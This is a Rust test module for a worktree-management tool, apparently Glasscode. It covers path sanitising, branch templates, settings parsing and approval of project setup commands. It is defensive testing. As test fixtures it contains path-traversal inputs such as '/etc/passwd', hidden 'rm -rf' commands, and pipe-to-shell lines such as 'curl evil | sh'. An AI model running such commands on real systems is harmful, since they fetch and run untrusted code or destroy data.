    #[test]
    fn a_folder_stays_below_the_worktree_folder() {
        let p = |s: &str| clean_folder(s);
        let parts = |s: &str| {
            p(s).map(|p| {
                p.components()
                    .map(|c| c.as_os_str().to_string_lossy().into_owned())
                    .collect::<Vec<_>>()
            })
        };
        assert_eq!(
            parts("app/feat-x"),
            Some(vec!["app".into(), "feat-x".into()])
        );
        // No `..`, no `.`, no root, no drive.
        assert_eq!(parts("../../outside"), Some(vec!["outside".into()]));
        assert_eq!(parts("app/../../x"), Some(vec!["app".into(), "x".into()]));
        assert_eq!(parts("./app/./x"), Some(vec!["app".into(), "x".into()]));
        assert_eq!(
            parts("/etc/passwd"),
            Some(vec!["etc".into(), "passwd".into()])
        );
        assert_eq!(
            parts("C:\\Windows\\x"),
            Some(vec!["C-".into(), "Windows".into(), "x".into()])
        );
        assert_eq!(
            parts("\\\\server\\share\\x"),
            Some(vec!["server".into(), "share".into(), "x".into()])
        );
        assert_eq!(parts("~/x"), Some(vec!["x".into()]));
        // Characters a Windows path cannot have, control characters, trailing dots and spaces.
        assert_eq!(
            parts("a<b>c:d\"e|f?g*h"),
            Some(vec!["a-b-c-d-e-f-g-h".into()])
        );
        assert_eq!(parts("a\u{1}b\u{202E}c"), Some(vec!["a-b-c".into()]));
        assert_eq!(
            parts("my app\u{A0}x/ünï"),
            Some(vec!["my-app-x".into(), "ünï".into()])
        );
        assert_eq!(
            parts("dots.../spaces   /x"),
            Some(vec!["dots".into(), "spaces".into(), "x".into()])
        );
        assert_eq!(
            parts("CON/lpt1.txt/Aux"),
            Some(vec!["CON_".into(), "lpt1.txt_".into(), "Aux_".into()])
        );
        // Depth and length.
        assert_eq!(
            parts("a/b/c/d/e/f").map(|p| p.len()),
            Some(FOLDER_DEPTH_MAX)
        );
        assert_eq!(
            parts(&"x".repeat(300)).unwrap()[0].chars().count(),
            FOLDER_PART_MAX
        );
        for nothing in ["", "/", "..", "../..", "./.", " . ", "\u{202E}", ":", "~"] {
            assert_eq!(p(nothing), None, "{nothing:?}");
        }
        for s in [
            "../../outside",
            "/etc/passwd",
            "C:\\Windows",
            "a/../../b",
            "\\\\srv\\s",
        ] {
            assert!(stays_below(&p(s).unwrap()), "{s}");
        }
        assert!(!stays_below(Path::new("../x")));
        assert!(!stays_below(Path::new("")));
    }

    #[test]
    fn the_worktree_folder_follows_the_template_and_stays_below_the_base() {
        let base = Path::new("base").join("worktrees");
        // Without a template: as before.
        assert_eq!(
            worktree_dir(&base, "my app", "feature/login", None),
            base.join("my-app").join("feature-login")
        );
        assert_eq!(
            worktree_dir(&base, "my app", "feature/login", Some(DEFAULT_FOLDER)),
            base.join("my-app").join("feature-login")
        );
        assert_eq!(
            worktree_dir(
                &base,
                "app",
                "feat/eng-826-sync",
                Some("{repo}-wt/{type}/{issue}")
            ),
            base.join("app-wt").join("feat").join("eng-826")
        );
        assert_eq!(
            worktree_dir(&base, "app", "feat/eng-826-sync", Some("{slug}")),
            base.join("eng-826-sync")
        );
        // A template that tries to leave, or leaves nothing.
        assert_eq!(
            worktree_dir(&base, "app", "x", Some("../../{branch}")),
            base.join("x")
        );
        assert_eq!(
            worktree_dir(&base, "app", "x", Some("C:/{branch}")),
            base.join("C-").join("x")
        );
        assert_eq!(
            worktree_dir(&base, "app", "x", Some("../..")),
            base.join("app").join("x")
        );
        assert_eq!(
            worktree_dir(&base, "app", "x", Some("{issue}")),
            base.join("app").join("x"),
            "no issue in the branch: nothing left"
        );
        assert!(
            worktree_dir(&base, "app", "x", Some("/../{repo}/..\\..\\{branch}")).starts_with(&base)
        );
    }

    #[test]
    fn the_first_folder_of_a_projects_worktrees() {
        assert_eq!(first_folder("my app", None).as_deref(), Some("my-app"));
        assert_eq!(
            first_folder("app", Some("{repo}-wt/{branch}")).as_deref(),
            Some("app-wt")
        );
        assert_eq!(
            first_folder("app", Some("../work/{repo}/{slug}")).as_deref(),
            Some("work")
        );
        assert_eq!(first_folder("app", Some("{branch}")), None);
        assert_eq!(first_folder("app", Some("{type}/{slug}")), None);
        assert_eq!(first_folder("app", Some("{issue}/{repo}")), None);
    }

    #[test]
    fn a_branch_from_the_template() {
        let labels = vec!["Bug".to_string()];
        let ticket = BranchFor {
            project_name: "My App",
            default: "eng-212-first-run-import",
            issue: Some("GLA-212"),
            title: Some("First run: import projects"),
            labels: &[],
        };
        assert_eq!(
            branch_name("{type}/{issue}-{slug}", &ticket).as_deref(),
            Some("feat/gla-212-first-run-import-projects")
        );
        assert_eq!(
            branch_name("{repo}/{branch}", &ticket).as_deref(),
            Some("my-app/eng-212-first-run-import")
        );
        let bug = BranchFor {
            labels: &labels,
            ..ticket.clone()
        };
        assert_eq!(
            branch_name("{type}/{issue}", &bug).as_deref(),
            Some("fix/gla-212")
        );
        // No ticket: the issue is left out, and the separator with it.
        let titled = BranchFor {
            project_name: "app",
            default: "",
            issue: None,
            title: Some("Flaky login test"),
            labels: &[],
        };
        assert_eq!(
            branch_name("{type}/{issue}-{slug}", &titled).as_deref(),
            Some("feat/flaky-login-test")
        );
        let fix = BranchFor {
            title: Some("Fix: the login test"),
            ..titled.clone()
        };
        assert_eq!(
            branch_name("{type}/{slug}", &fix).as_deref(),
            Some("fix/fix-login-test")
        );
        // Nothing tells the work apart: no name from the template.
        let bare = BranchFor {
            project_name: "app",
            default: "",
            issue: None,
            title: None,
            labels: &[],
        };
        assert_eq!(branch_name("{type}/{issue}-{slug}", &bare), None);
        // A GitHub issue's number.
        let issue = BranchFor {
            issue: Some("#123"),
            ..titled.clone()
        };
        assert_eq!(
            branch_name("{issue}-{slug}", &issue).as_deref(),
            Some("123-flaky-login-test")
        );
        // A title with characters a branch cannot have.
        let odd = BranchFor {
            title: Some("Make ~/.config:work? [again]"),
            ..titled.clone()
        };
        let name = branch_name("{type}/{slug}", &odd).unwrap();
        assert!(
            clean_branch(&name).as_deref() == Some(name.as_str()),
            "{name}"
        );
        // A template that leaves nothing valid.
        assert_eq!(branch_name("..", &ticket), None);
    }

    #[test]
    fn a_project_value_wins_over_the_personal_value() {
        assert_eq!(
            in_effect(Some("codex"), Some("shell"), "claude"),
            ("codex", Source::Project)
        );
        assert_eq!(
            in_effect(None, Some("shell"), "claude"),
            ("shell", Source::Personal)
        );
        assert_eq!(
            in_effect::<&str>(None, None, "claude"),
            ("claude", Source::Glasscode)
        );
    }

    #[test]
    fn a_broken_file_gives_the_defaults_and_one_warning() {
        for text in ["{ \"setup\": ", "[1, 2]", "\"text\"", "", "{ setup: 1 }"] {
            let loaded = parse(text);
            assert_eq!(
                (loaded.settings.clone(), loaded.state, loaded.warnings.len()),
                (ProjectSettings::default(), FileState::Broken, 1),
                "{text:?}"
            );
        }
        assert!(parse("{ \"setup\": ").warnings[0].contains("line 1"));
        // Values of the wrong kind: each is ignored with its own warning, the others stay.
        let loaded = parse(
            r#"{ "setup": 5, "branch_template": "{type}/{slug}", "worktree_folder": ["x"], "default_agent": null }"#,
        );
        assert_eq!(loaded.state, FileState::Read);
        assert_eq!(
            loaded.settings,
            ProjectSettings {
                branch_template: Some("{type}/{slug}".into()),
                ..Default::default()
            }
        );
        assert_eq!(loaded.warnings.len(), 2, "{:?}", loaded.warnings);
    }

    #[test]
    fn the_file_is_read_with_a_size_limit() {
        let dir = tempfile::tempdir().unwrap();
        assert_eq!(
            load(dir.path()),
            Loaded::default(),
            "no file: the defaults and no warning"
        );
        std::fs::create_dir_all(dir.path().join(DIR)).unwrap();
        let mut big = String::from("{ \"setup\": \"echo hi\", \"pad\": \"");
        big.push_str(&"x".repeat(MAX_BYTES as usize));
        big.push_str("\" }");
        std::fs::write(file(dir.path()), &big).unwrap();
        let loaded = load(dir.path());
        assert_eq!(
            (loaded.state, loaded.settings.setup, loaded.warnings.len()),
            (FileState::Broken, None, 1)
        );
        std::fs::write(file(dir.path()), [0xff, 0xfe, b'{']).unwrap();
        assert_eq!(load(dir.path()).state, FileState::Broken);
        std::fs::write(
            file(dir.path()),
            r#"{ "setup": "  echo setup ran  ", "default_agent": "Codex" }"#,
        )
        .unwrap();
        let loaded = load(dir.path());
        assert_eq!(
            (
                loaded.state,
                loaded.settings.setup.as_deref(),
                loaded.settings.default_agent
            ),
            (
                FileState::Read,
                Some("echo setup ran"),
                Some(AgentKind::Codex)
            )
        );
        assert!(loaded.warnings.is_empty());
    }

    #[test]
    fn only_the_agents_that_exist_are_taken() {
        for (word, agent) in [
            ("claude", Some(AgentKind::Claude)),
            ("CODEX", Some(AgentKind::Codex)),
            (" shell ", Some(AgentKind::Shell)),
            ("gemini", None),
            ("cursor", None),
        ] {
            let loaded = parse(&format!(r#"{{ "default_agent": "{word}" }}"#));
            assert_eq!(loaded.settings.default_agent, agent, "{word}");
            assert_eq!(
                loaded.warnings.len(),
                usize::from(agent.is_none()),
                "{word}: {:?}",
                loaded.warnings
            );
        }
    }

    #[test]
    fn a_setup_that_does_not_show_as_itself_is_not_used() {
        // Each class that could make the card show one thing while the shell runs another; the
        // warning names the character.
        for (setup, code) in [
            ("echo a\necho b", "U+000A"),
            ("echo a\rb", "U+000D"),
            ("echo\ta", "U+0009"),
            ("echo \u{1b}[2Jx", "U+001B"),
            ("echo a\u{202E}b", "U+202E"),
            ("echo \u{200B}x", "U+200B"),
            ("echo \u{2066}x", "U+2066"),
            ("echo \u{FEFF}x", "U+FEFF"),
            ("echo \u{E0041}x", "U+E0041"),
            ("echo x\u{FE0F}", "U+FE0F"),
            ("echo a\u{2028}b", "U+2028"),
            ("echo a\u{2029}b", "U+2029"),
            ("echo e\u{301}", "U+0301"),
            ("echo a\u{A0}b", "U+00A0"),
            ("echo a\u{3000}b", "U+3000"),
            ("echo a\u{AD}b", "U+00AD"),
            ("echo caf\u{E9}", "U+00E9"),
            ("rm -rf \u{FF0F}", "U+FF0F"),
        ] {
            let loaded = parse(&serde_json::json!({ "setup": setup }).to_string());
            assert_eq!(
                (loaded.settings.setup.clone(), loaded.warnings.len()),
                (None, 1),
                "{setup:?}"
            );
            assert!(
                loaded.warnings[0].contains(code),
                "{setup:?}: {}",
                loaded.warnings[0]
            );
        }
        // A long run of spaces could push the rest of the command out of view; 8 are fine.
        let pushed = format!("echo hi;{}rm -rf x", " ".repeat(SETUP_SPACES_MAX + 1));
        let loaded = parse(&serde_json::json!({ "setup": pushed }).to_string());
        assert_eq!((loaded.settings.setup, loaded.warnings.len()), (None, 1));
        assert!(loaded.warnings[0].contains("spaces in a row"));
        let eight = format!("echo a{}b", " ".repeat(SETUP_SPACES_MAX));
        assert_eq!(
            parse(&serde_json::json!({ "setup": eight.clone() }).to_string())
                .settings
                .setup,
            Some(eight)
        );
        // A normal command: pipes, quotes, &&, ||, ;, > and $VAR.
        let normal = r#"pnpm install && cat "$HOME/.npmrc" | grep 'registry' ; echo $VAR > out.txt || exit 1"#;
        let loaded = parse(&serde_json::json!({ "setup": normal }).to_string());
        assert_eq!(
            (loaded.settings.setup.as_deref(), loaded.warnings.len()),
            (Some(normal), 0)
        );
        let long = parse(&serde_json::json!({ "setup": "x".repeat(SETUP_MAX + 1) }).to_string());
        assert_eq!((long.settings.setup, long.warnings.len()), (None, 1));
        let fine = parse(
            &serde_json::json!({ "setup": "pnpm install && copy ..\\.env.local ." }).to_string(),
        );
        assert_eq!(
            fine.settings.setup.as_deref(),
            Some("pnpm install && copy ..\\.env.local .")
        );
    }

    #[test]
    fn writing_keeps_the_keys_glasscode_does_not_know() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(DIR)).unwrap();
        std::fs::write(file(root), "{\n  \"pinned_cli\": { \"claude\": \"2.1\" },\n  \"setup\": \"old\",\n  \"zeta\": 1\n}\n").unwrap();
        let values = ProjectSettings {
            setup: Some("echo setup ran".into()),
            branch_template: None,
            worktree_folder: Some("{repo}/{branch}".into()),
            default_agent: Some(AgentKind::Shell),
        };
        write(root, &values).unwrap();
        let text = std::fs::read_to_string(file(root)).unwrap();
        let value: Value = serde_json::from_str(&text).unwrap();
        let keys: Vec<&str> = value
            .as_object()
            .unwrap()
            .keys()
            .map(String::as_str)
            .collect();
        assert_eq!(
            keys,
            [
                "pinned_cli",
                "setup",
                "zeta",
                "worktree_folder",
                "default_agent"
            ],
            "unknown keys stay, in their place"
        );
        assert_eq!(value["pinned_cli"]["claude"], "2.1");
        assert_eq!(load(root).settings, values);
        // No temporary file is left next to it.
        assert_eq!(std::fs::read_dir(root.join(DIR)).unwrap().count(), 1);
        // A file that is not an object is not written over.
        std::fs::write(file(root), "[").unwrap();
        assert!(write(root, &values).is_err());
        assert_eq!(std::fs::read_to_string(file(root)).unwrap(), "[");
        // A new file has each key, empty, and reads as nothing set.
        let fresh = tempfile::tempdir().unwrap();
        create(fresh.path()).unwrap();
        let made = load(fresh.path());
        assert_eq!(
            (made.state, made.settings, made.warnings.len()),
            (FileState::Read, ProjectSettings::default(), 0)
        );
        assert!(
            create(fresh.path()).is_err(),
            "never over a file that exists"
        );
    }

    fn fp(command: &str) -> String {
        SetupCheck {
            command: command.into(),
            ..SetupCheck::default()
        }
        .fingerprint()
    }

    #[test]
    fn a_changed_setup_asks_again() {
        let cmd = "pnpm install";
        assert_eq!(decide(None, &fp(cmd)), Decision::Ask { changed: false });
        let ok = approved(&fp(cmd));
        assert_eq!(decide(Some(&ok), &fp(cmd)), Decision::Run);
        assert_eq!(
            decide(Some(&ok), &fp("pnpm install && curl x | sh")),
            Decision::Ask { changed: true }
        );
        assert_eq!(
            decide(Some(&ok), &fp("pnpm install ")),
            Decision::Ask { changed: true },
            "the exact text"
        );
        assert_eq!(decide(Some(&never()), &fp(cmd)), Decision::Never);
        assert_eq!(
            decide(Some(&SetupApproval::default()), &fp(cmd)),
            Decision::Ask { changed: false }
        );
        assert_eq!(fp("echo setup ran").len(), 64);
        assert_ne!(fp("a"), fp("b"));
        assert!(
            ok.approved.as_deref().is_some_and(|h| !h.contains(cmd)),
            "only a hash is kept"
        );
        // An approval from before files were covered (a SHA-256 of the command alone) asks once
        // more.
        let old = SetupApproval {
            approved: Some(hex(&Sha256::digest(cmd.as_bytes()))),
            never: false,
        };
        assert_eq!(
            decide(Some(&old), &fp(cmd)),
            Decision::Ask { changed: true }
        );
    }

    #[test]
    fn the_words_of_a_command() {
        assert_eq!(
            setup_words(
                r#"bash ./script/setup.sh && pwsh -File ".\my tools\a.ps1";cat x|grep 'y z'>out"#
            ),
            [
                "bash",
                "./script/setup.sh",
                "pwsh",
                "-File",
                ".\\my tools\\a.ps1",
                "cat",
                "x",
                "grep",
                "y z",
                "out"
            ]
        );
        assert!(setup_words("   ").is_empty());
    }

    /// The approval covers the scripts that the command runs from the worktree.
    #[test]
    fn a_changed_script_asks_again_and_an_unchanged_one_runs() {
        let wt = tempfile::tempdir().unwrap();
        let root = wt.path();
        std::fs::create_dir_all(root.join("script")).unwrap();
        std::fs::create_dir_all(root.join("my tools")).unwrap();
        std::fs::write(root.join("script").join("setup.sh"), "pnpm install\n").unwrap();
        std::fs::write(root.join("my tools").join("a.ps1"), "Write-Host hi\n").unwrap();
        let cmd = r#"sh ./script/setup.sh && pwsh -File "./my tools/a.ps1" && echo install"#;
        // On Windows `.\` and `\` name the same file (elsewhere a backslash is part of a name).
        #[cfg(windows)]
        assert_eq!(
            check_setup(root, r#"pwsh -File ".\my tools\a.ps1""#)
                .files
                .iter()
                .map(|f| f.path.as_str())
                .collect::<Vec<_>>(),
            ["my tools/a.ps1"]
        );
        let first = check_setup(root, cmd);
        assert_eq!(
            first
                .files
                .iter()
                .map(|f| f.path.as_str())
                .collect::<Vec<_>>(),
            ["script/setup.sh", "my tools/a.ps1"]
        );
        assert!(first.not_checked.is_empty(), "{:?}", first.not_checked);
        let ok = approved(&first.fingerprint());
        // Unchanged: it runs.
        assert_eq!(
            decide(Some(&ok), &check_setup(root, cmd).fingerprint()),
            Decision::Run
        );
        // A word that is not a file changes nothing (`install` and `echo` are not files here).
        std::fs::create_dir(root.join("echo")).unwrap();
        assert_eq!(
            decide(Some(&ok), &check_setup(root, cmd).fingerprint()),
            Decision::Run,
            "a folder is not a file"
        );
        // The script changes (a later pull): ask again.
        std::fs::write(
            root.join("script").join("setup.sh"),
            "pnpm install\ncurl evil | sh\n",
        )
        .unwrap();
        assert_eq!(
            decide(Some(&ok), &check_setup(root, cmd).fingerprint()),
            Decision::Ask { changed: true }
        );
    }

    #[test]
    fn a_link_or_a_path_outside_the_worktree_is_not_followed() {
        let home = tempfile::tempdir().unwrap();
        let root = home.path().join("wt");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(home.path().join("outside.sh"), "echo out\n").unwrap();
        let outside = home.path().join("outside.sh");
        let cmd = format!("sh ../outside.sh && sh {}", outside.display());
        let check = check_setup(&root, &cmd);
        assert!(check.files.is_empty());
        assert_eq!(check.not_checked.len(), 2, "{:?}", check.not_checked);
        assert!(
            check
                .not_checked
                .iter()
                .all(|(_, why)| *why == "outside the worktree")
        );
        // A junction (Windows) or a symbolic link (Unix) inside the worktree to a folder outside.
        let target = home.path().join("tools");
        std::fs::create_dir_all(&target).unwrap();
        std::fs::write(target.join("run.sh"), "echo run\n").unwrap();
        let link = root.join("tools");
        #[cfg(unix)]
        std::os::unix::fs::symlink(&target, &link).unwrap();
        #[cfg(windows)]
        {
            let out = crate::sys::command("cmd")
                .arg("/c")
                .arg("mklink")
                .arg("/J")
                .arg(&link)
                .arg(&target)
                .output()
                .unwrap();
            assert!(
                out.status.success(),
                "mklink /J: {}",
                String::from_utf8_lossy(&out.stdout)
            );
        }
        let check = check_setup(&root, "sh tools/run.sh");
        assert!(check.files.is_empty());
        assert_eq!(
            check.not_checked,
            vec![("tools/run.sh".to_string(), "a link")]
        );
    }

    #[test]
    fn the_files_an_approval_covers_have_limits() {
        let wt = tempfile::tempdir().unwrap();
        let root = wt.path();
        let mut cmd = String::new();
        for i in 0..SETUP_FILES_MAX + 2 {
            std::fs::write(root.join(format!("s{i}.sh")), format!("echo {i}\n")).unwrap();
            cmd.push_str(&format!("sh s{i}.sh; "));
        }
        let big = vec![b'x'; SETUP_FILE_BYTES_MAX as usize + 1];
        std::fs::write(root.join("big.sh"), &big).unwrap();
        cmd.push_str("sh big.sh");
        let check = check_setup(root, &cmd);
        assert_eq!(check.files.len(), SETUP_FILES_MAX);
        // The two scripts past the limit, and big.sh after them, are named as not checked.
        let past: Vec<&str> = check
            .not_checked
            .iter()
            .filter(|(_, why)| *why == "more files than are checked")
            .map(|(w, _)| w.as_str())
            .collect();
        assert_eq!(past, ["s8.sh", "s9.sh", "big.sh"]);
        // A big file alone is not read, and says so.
        let alone = check_setup(root, "sh big.sh");
        assert_eq!(
            alone.not_checked,
            vec![("big.sh".to_string(), "larger than 1 MB, or unreadable")]
        );
        assert!(alone.files.is_empty());
    }

    #[test]
    fn a_new_worktree_is_taken_once() {
        let path = Path::new("wt-a");
        assert!(take_new_worktree(path).is_none());
        remember_new_worktree(path, Path::new("root"), parse(r#"{ "setup": "echo hi" }"#));
        let new = take_new_worktree(path).unwrap();
        assert_eq!(
            (new.root.as_path(), new.loaded.settings.setup.as_deref()),
            (Path::new("root"), Some("echo hi"))
        );
        assert!(take_new_worktree(path).is_none());
        for i in 0..NEW_KEEP + 5 {
            remember_new_worktree(
                &PathBuf::from(format!("many-{i}")),
                Path::new("root"),
                Loaded::default(),
            );
        }
        assert!(
            take_new_worktree(Path::new("many-0")).is_none(),
            "the oldest went"
        );
        assert!(take_new_worktree(&PathBuf::from(format!("many-{}", NEW_KEEP + 4))).is_some());
    }
}
